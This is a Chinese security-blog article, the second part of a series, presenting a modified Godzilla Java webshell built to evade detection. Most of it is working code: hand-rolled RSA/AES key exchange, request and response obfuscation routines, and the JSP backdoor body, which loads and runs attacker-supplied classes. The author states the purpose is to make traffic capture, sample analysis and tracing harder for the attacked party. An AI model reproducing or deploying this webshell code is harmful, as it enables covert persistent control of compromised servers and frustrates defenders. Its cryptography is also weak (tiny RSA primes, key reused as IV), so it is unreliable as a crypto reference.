接上篇 [Godzilla哥斯拉修改版(上) 分析篇](https://www.freebuf.com/sectool/273767.html)

##  **0x02 修改版思路分享**

### 优化特点

1、增加RSA原理的加密方式  
2、使用数学公式手动实现RSA机制，减少依赖避免环境限制  
3、RSA结合AES动态密钥传输流量全加密，捕获全量数据包+捕获样本+获得客户端代码也无法解密还原，增加被攻击方检测发现阶段和溯源分析阶段的难度和成本  
5、请求数据随机生成参数名，随机长度拆分参数值  
6、响应内容随机伪造html标签，插入干扰字符  
7、payload存储在application中减少重复上传

### 思路梳理

 **后门连接为什么要有密码？**

> 密码作为一种认证方式为了控制使用范围，只有自己能够利用，对于程序来说，通过识别是否掌握某段秘密数据来区分身份

 **哥斯拉为什么将密钥内置进shell中？**

>
> 此前冰蝎采用固定密码作为认证手段，后门生成动态密钥返回给客户端，再使用AES加密流量，缺点在于中间流量虽然被加密，但是密钥在连接阶段以明文的形式暴露在流量中，具有明显特征，安全设备已经可以在识别到冰蝎后，精准提取密钥解密后续流量。而内置到文件中，省去中间明文传递数据的环节，纯流量设备无法解密

 **固定密钥有什么弊端？**

>
> 从流量角度看，相同的请求数据用同一个AES密钥加密后的密文相同（无iv），字符内容范围有限，长度有规律。终端分析角度看，密钥这一段数据无处躲藏，写死在后门文件中，流量设备联动EDR或人工方式仍然能解密获得详细的后门利用操作

 **后门与正常页面区别在哪？**

> 访问行为上，源IP较少，来源单一，与历史记录相比，属于新增URL，数据传输上，请求参数较为固定，内容不可读，响应页面DOM结构与正常页面差异较大

 **为什么大多后门需要设置参数名？**

>
> 请求本质是交换数据，确定参数名称可以精确又方便的传递或获取带有特定含义的数据，参数名可以看作数据在http数据结构中的坐标，参数名解决的是数据交换过程的约定途径，不影响数据本身，只要双方传递与获取途径约定一致，参数名的形式可以转换为其他形式

### 优化方案

1、使用rsa方式加密，使用两个密钥完成加解密，只获得一个公钥无法解密  
2、rsa加密长度有限，参考网易云web登录方案，动态生成AES密钥，首次用rsa交换aes密钥，后续切换到aes  
3、请求参数随机化，请求内容转为hex值，分散到多个随机参数中，中间插入干扰字符  
4、响应内容随机化，插入干扰字符，随机加入html标签

### 实现代码

 **rsa原理**

加密和解密可以使用不同的规则，只要这两种规则之间存在某种对应关系即可，这样就避免了直接传递密钥。 这种新的加密模式被称为 "非对称加密算法"。

（1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。  
（2）甲方获取乙方的公钥，然后用它对信息加密。  
（3）乙方得到加密后的信息，用私钥解密。 如果公钥加密的信息只有私钥解得开，那么只要私钥不泄漏，通信就是安全的。

 **概念**

 **互质﻿**

如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系（coprime）。比如61与53

 **欧拉函数﻿**

对正整数n，欧拉函数是小于或等于n的正整数中与n互质的数的数目。比如φ(8)=4，1到8中间有1,3,5,7四个数字与8互质

如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如 5 与 1、2、3、4 都构成互质关系。

如果n可以分解成两个质数的整数之积，则能快速求值：  
![](https://image.3001.net/images/20210520/1621483414_60a5df96278a591d1ac5e.png!small)

 **`欧拉定理`**  
x的φ(n)次方的值，模n的余数一定为1  
![](https://image.3001.net/images/20210520/1621483414_60a5df96abd6ddc2a6948.png!small)

 **`模反元素`**  
如果两个正整数a和n互质，那么一定可以找到整数 b，使得 ab被n除的余数是 1  
![](https://image.3001.net/images/20210520/1621483415_60a5df978fc4c2707996a.png!small)

 **数学公式**

![](https://image.3001.net/images/20210520/1621483416_60a5df98770bbeee8e176.png!small)

> 相关文章：  
> https://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html  
> https://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html  
> https://livebook.manning.com/book/real-world-cryptography

## 0x03 核心代码实现

### 加密与混淆代码

根据上面数学公式编码成相关java方法

 **工具方法**

    
    
    private static final SecureRandom random = new SecureRandom();
    private static final String aesMode = "AES/CFB/NoPadding";
    static {
        random.setSeed(new Date().getTime());
    }
    
    /**
     * hex解码为byte
     *
     * @param data
     * @return
     */
    public static byte[] hex2b(String data) {
        byte[] byteArray = new BigInteger(data, 36)
                .toByteArray();
        if (byteArray[0] == 0) {
            byte[] output = new byte[byteArray.length - 1];
            System.arraycopy(
                    byteArray, 1, output,
                    0, output.length);
            return output;
        }
        return byteArray;
    }
    
    /**
     * byte编码为hex
     *
     * @param data
     * @return
     */
    public static String b2hex(byte[] data){
        return new BigInteger(1, data).toString(36).toLowerCase();
    }
    
    /**
     * 字节转为字符串
     *
     * @param data
     * @return
     */
    public static String b2s(byte[] data) {
        try {
            return new String(data, "utf-8");
        } catch (Exception e) {
            return "";
        }
    }
    
    /**
     * 字符串转为字节
     *
     * @param data
     * @return
     */
    public static byte[] s2b(String data) {
        try {
            return data.getBytes("utf-8");
        } catch (Exception e) {
            return new byte[]{};
        }
    }
    

**手动实现RSA算法**

    
    
    private static final SecureRandom random = new SecureRandom();
    private static final BigInteger e = BigInteger.valueOf(65537);
    
    static {
        random.setSeed(new Date().getTime());
    }
    
    // 获取一个质数
    public static BigInteger getPrime(int bitLength) {
        BigInteger p;
        while (!(p = BigInteger.probablePrime(bitLength, random)).isProbablePrime(100)) {
            continue;
        }
        return p;
    }
    
    // 生成rsa三个参数
    public static BigInteger[] genRsaKey() {
        BigInteger p, q, n, φ, d, e = BigInteger.valueOf(65537);
        p = getPrime(80);
        q = getPrime(84);
        n = p.multiply(q);
        φ = p.subtract(BigInteger.ONE).multiply(q.subtract(BigInteger.ONE));
        d = extGcd(e, φ)[0];
        BigInteger[] result = new BigInteger[]{n, e, d};
        if (d.compareTo(BigInteger.ONE) < 0 || !p.gcd(q).equals(BigInteger.ONE)) {
            return genRsaKey();
        }
        return result;
    }
    
    // rsa加密
    public static byte[] rsaEncrype(byte[] m, BigInteger n, BigInteger e) {
        if (e == null) {
            e = BigInteger.valueOf(65537);
        }
        return new BigInteger(m).modPow(e, n).toByteArray();
    }
    
    // rsa解密
    public static byte[] rsaDecrype(byte[] c, BigInteger n, BigInteger d) {
        return new BigInteger(c).modPow(d, n).toByteArray();
    }
    
    // 扩展欧几里得算法，求私钥d
      public static BigInteger[] extGcd(BigInteger a, BigInteger b) {
          BigInteger[] result = null;
          if (b.equals(BigInteger.ZERO)) {
              result = new BigInteger[]{BigInteger.ONE, BigInteger.ZERO};
              return result;
          }
          result = extGcd(b, a.mod(b));
          BigInteger x = result[1];
          BigInteger y = result[0].subtract(a.divide(b).multiply(x));
          result = new BigInteger[]{x, y};
          return result;
      }
    

**AES算法**

    
    
    private static final String aesMode = "AES/CFB/NoPadding"; // 密文长度与原文一样，处理起来方便一些。
    
    /**
     * aes加密
     *
     * @param s
     * @param k
     * @return
     */
    public static byte[] aesEncrypt(byte[] s, String k) {
        try {
            Cipher c = Cipher.getInstance(aesMode);
            // 密钥为 xc
            c.init(1, new SecretKeySpec(k.getBytes(), "AES"), new IvParameterSpec(k.getBytes()));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }
    
    /**
     * aes解密
     *
     * @param s
     * @param k
     * @return
     */
    public static byte[] aesDecrypt(byte[] s, String k) {
        try {
            Cipher c = Cipher.getInstance(aesMode);
            // 密钥为 xc
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"), new IvParameterSpec(k.getBytes()));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }
    

**随机字符**

    
    
    /**
     * 获取随机或定长字符
     *
     * @param len 0为随机，其他为定长
     * @return
     */
    public static String randLetter(int len) {
        if (len == 0) {
            len = random.nextInt(5) + 1;
        }
        StringBuilder s = new StringBuilder();
        while (len-- > 0) {
            s.append((char) (0x61 + (int) (Math.random() * (0x7a - 0x61 + 1))));
        }
        return s.toString();
    }
    
    /**
     * 随机生成中文字符
     *
     * @param len 最多
     * @return
     */
    public static String randomChar(int len) {
        StringBuilder s = new StringBuilder();
        len = random.nextInt(len) + 1;
        for (int i = 0; i < len; i++) {
            s.append((char) (0x4e00 + (int) (Math.random() * (0x9fa5 - 0x4e00))));
        }
        return b2s(s.toString().getBytes());
    }
    
    /**
     * 随机插入中文
     *
     * @param data
     * @return
     */
    public static String insertRandomChar(String data) {
        StringBuilder s = new StringBuilder();
        try {
            for (int i = 0; i < data.length(); i++) {
                char ch = data.charAt(i);
                s.append(ch);
                if (random.nextInt() % 11 == 0) {
                    s.append(randomChar(1));
                } else if (random.nextInt() % 11 == 0) {
                    s.append(randLetter(1).toUpperCase());
                }
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return s.toString();
    }
    

**混淆客户端请求数据算法**

    
    
    /**
     * 混淆请求，将字符串随机插入中文和大写字母，转换为随机的url参数
     * abcd -> huqw=ab&fuq3=c&jb9r=d
     *
     * @param data
     * @return
     */
    public static String obf_req(String data) {
        data = insertRandomChar(data);
        ArrayList<String> params = new ArrayList<String>();
        int left = data.length();
        int now = 0;
        while (left!=0) {
            int len = random.nextInt(30) + 10;
            len = len > left ? left : len;
            String value = data.substring(now, now + len);
            String key = randLetter(0);
            params.add(key + "=" + value);
            left-=len;
            now +=len;
        }
        return String.join("&", params);
    }
    

**混淆后门页面响应算法**

    
    
    /**
     * 混淆响应，将字符串随机插入中文和大写字母，插入随机的html标签
     * abcd -> 啊aB<huwf>bQWEQWE啊c</jfwe>d
     *
     * @param data
     * @return
     */
    public static String obf_rsp(String data) {
        data = insertRandomChar(data);
        StringBuilder s = new StringBuilder();
        int transLen = 0;
        while (transLen < data.length()) {
            // 平均每段长度控制在 5～30个字符
            int len = random.nextInt(25) + 5;
            int left = data.length() - transLen;
            len = len > left ? left : len;
            String value = data.substring(transLen, transLen + len);
            String tag = randLetter(0).replaceAll("[^a-z]", "");
            if (random.nextInt() % 2 == 0) {
                s.append("<" + tag + ">");
            }
            s.append(value);
            if (random.nextInt() % 2 == 0) {
                s.append("</" + tag + ">\n");
            }
            transLen += len;
        }
        return s.toString();
    }
    

**混淆还原算法**

    
    
    // 提取post内容的值
    public static String getPostValue(ServletRequest request) {
        java.io.BufferedReader reader = null;
        StringBuilder s = new StringBuilder();
        try {
            reader = new java.io.BufferedReader(new java.io.InputStreamReader(request.getInputStream(), "utf-8"));
            String line = null;
            while ((line = reader.readLine()) != null) {
                s.append(line);
            }
            reader.close();
            String[] params = s.toString().split("&");
            s = new StringBuilder();
            for (String kv : params) {
                s.append(kv.split("=")[1]);
            }
        } catch (Exception e) {
        }
        return s.toString();
    }
    
    /**
     * 净化混淆过的数据，去掉标签中文等字符，保留小写字母和数字
     *
     * @param rsp
     * @return
     */
    public static String purify(String data){
        return data.replaceAll("(</?[^>]*?>|[\\W]|[A-Z])", "");
    }
    

### webshell代码

 **RSA rawGlobalCode**

    
    
    static java.security.SecureRandom random = new java.security.SecureRandom();
    public static BigInteger n = new BigInteger("{pass}", 36);
    public static BigInteger e = BigInteger.valueOf(65537);
    
    // 通过字节动态加载class
    class X extends ClassLoader {
        public X(ClassLoader z) {
            super(z);
        }
    
        public Class Q(byte[] cb) {
            return super.defineClass(cb, 0, cb.length);
        }
    }
    
    
    // AES加解密方法，参数m为true加密，false解密
    public byte[] x(byte[] s, String k, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES/CFB/NoPadding");
            // 密钥为 xc
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"), new javax.crypto.spec.IvParameterSpec(k.getBytes()));
            return c.doFinal(s);
        } catch (Exception e) {
            return new byte[]{};
        }
    }
    
    public static byte[] hex2b(String data) {
        byte[] byteArray = new BigInteger(data, 36).toByteArray();
        if (byteArray[0] == 0) {
            byte[] output = new byte[byteArray.length - 1];
            System.arraycopy(byteArray, 1, output, 0, output.length);
            return output;
        }
        return byteArray;
    }
    
    public static String b2hex(byte[] data) {
        return new BigInteger(1, data).toString(36).toLowerCase();
    }
    
    public static String b2s(byte[] data) {
        try {
            return new String(data, "utf-8");
        } catch (Exception e) {
            return "";
        }
    }
    
    public static byte[] s2b(String data) {
        try {
            return data.getBytes("utf-8");
        } catch (Exception e) {
            return new byte[]{};
        }
    }
    
    public static String randLetter(int len) {
        if (len == 0) {
            len = random.nextInt(8) + 1;
        }
        StringBuilder s = new StringBuilder();
        while (len-- > 0) {
            s.append((char) (0x61 + (int) (Math.random() * (0x7a - 0x61 + 1))));
        }
        return s.toString();
    }
    
    public static String randomChar(int len) {
        StringBuilder s = new StringBuilder();
        try {
            len = random.nextInt(len);
            for (int i = 0; i < len; i++) {
                s.append((char) (0x4e00 + (int) (Math.random() * (0x9fa5 - 0x4e00 + 1))));
            }
        } catch (Exception e) {
        }
        return s.toString();
    }
    
    public static String insertRandomChar(String data) {
        StringBuilder s = new StringBuilder();
        try {
            for (int i = 0; i < data.length(); i++) {
                char ch = data.charAt(i);
                s.append(ch);
                if (random.nextInt() % 6 == 0) {
                    s.append(randomChar(2));
                } else if (random.nextInt() % 6 == 0) {
                    s.append(randLetter(0).toUpperCase());
                }
            }
        } catch (Exception e) {
        }
        return s.toString();
    }
    
    
    public static String obf_rsp(String data) {
        data = insertRandomChar(data);
        StringBuilder s = new StringBuilder();
        int transLen = 0;
        while (transLen < data.length()) {
            // 平均每段长度控制在 5～30个字符
            int len = random.nextInt(25) + 5;
            int left = data.length() - transLen;
            len = len > left ? left : len;
            String value = data.substring(transLen, transLen + len);
            String tag = randLetter(0).replaceAll("[^a-z]", "");
            if (random.nextInt() % 2 == 0) {
                s.append("<" + tag + ">");
            }
            s.append(value);
            if (random.nextInt() % 2 == 0) {
                s.append("</" + tag + ">\n");
            }
            transLen += len;
        }
        return s.toString();
    }
    
    
    public static String purify_req(String s) {
        return s.replaceAll("(<[^>]*?>|[\\W]|[A-Z])+", "");
    }
    
    public static byte[] rsaEncrypt(byte[] m, BigInteger n, BigInteger e) {
        if (e == null) {
            e = BigInteger.valueOf(65537);
        }
        return new BigInteger(m).modPow(e, n).toByteArray();
    }
    
    public static byte[] rsaDecrypt(byte[] c, BigInteger n, BigInteger d) {
        return new BigInteger(c).modPow(d, n).toByteArray();
    }
    
    public static String getPostValue(ServletRequest request) {
        java.io.BufferedReader reader = null;
        StringBuilder s = new StringBuilder();
        try {
            reader = new java.io.BufferedReader(new java.io.InputStreamReader(request.getInputStream(), "utf-8"));
            String line = null;
            while ((line = reader.readLine()) != null) {
                s.append(line);
            }
            reader.close();
            String[] params = s.toString().split("&");
            s = new StringBuilder();
            for (String kv : params) {
                s.append(kv.split("=")[1]);
            }
        } catch (Exception e) {
        }
        return s.toString();
    }
    

**RSA rawCode.bin**

    
    
    String rsp = null;
    try {
        response.setCharacterEncoding("UTF-8");
        random.setSeed(new java.util.Date().getTime());
        String post = getPostValue((ServletRequest) request);
        post = purify_req(post);
        byte[] data = hex2b(post);
    
        if (session.isNew()) {
            // 首次访问，不做处理，返回随机内容
        } else if (session.getAttribute("k") == null) {
            // 第二次访问，生成aes密钥
            String key = randLetter(15);
            // 第一个字符标记是否需要传一次payload
            key = (application.getAttribute("p") == null ? "0" : "1") + key;
            session.setAttribute("k", key);
            String str = b2s(rsaDecrypt(data, n, e));
            if (session.getId().substring(0, 16).equals(str)) {
                // 通过认证，返回aes key
    
                rsp = b2hex(rsaEncrypt(key.getBytes(), n, e));
                rsp = obf_rsp(rsp);
                out.write(rsp);
            }
        } else {
            // AES 解密
            String key = (String) session.getAttribute("k");
            data = x(data, key, false);
            if (application.getAttribute("p") == null) {
                application.setAttribute("p",
                        new X(pageContext.getClass().getClassLoader()).Q(data));
            } else {
                request.setAttribute("parameters", b2s(data));
                Object f = ((Class) application.getAttribute("p")).newInstance();
                f.equals(pageContext);
                rsp = f.toString();
                rsp = b2hex(x(s2b(rsp), key, true));
                out.write(obf_rsp(rsp));
            }
        }
    } catch (Exception e) {
        System.out.println(e.getMessage());
    }
    
    if (rsp == null) {
        out.write(obf_rsp(randomChar(128)));
    }
    

## 0x04 修改版使用效果演示

### 生成

![生成](https://image.3001.net/images/20210520/1621483417_60a5df99b29435394b201.png!small)

### 上传后访问

![上传后访问](https://image.3001.net/images/20210520/1621483418_60a5df9ab26fa4c234e3e.png!small)

### 添加

![添加后门](https://image.3001.net/images/20210520/1621483419_60a5df9b909a2a2b4bae4.png!small)

### 连接

![连接后门](https://image.3001.net/images/20210520/1621483420_60a5df9c4db089f309c4c.png!small)

### 请求包

![请求包](https://image.3001.net/images/20210520/1621483421_60a5df9d64e70cff15faa.png!small)

### 响应包

![响应包](https://image.3001.net/images/20210520/1621483422_60a5df9e6eb0c09197f95.png!small)

## 0x05 后门连接流程图

![后门连接流程图](https://image.3001.net/images/20210520/1621483423_60a5df9f8eba134601d3d.png!small)

\-- EOF--
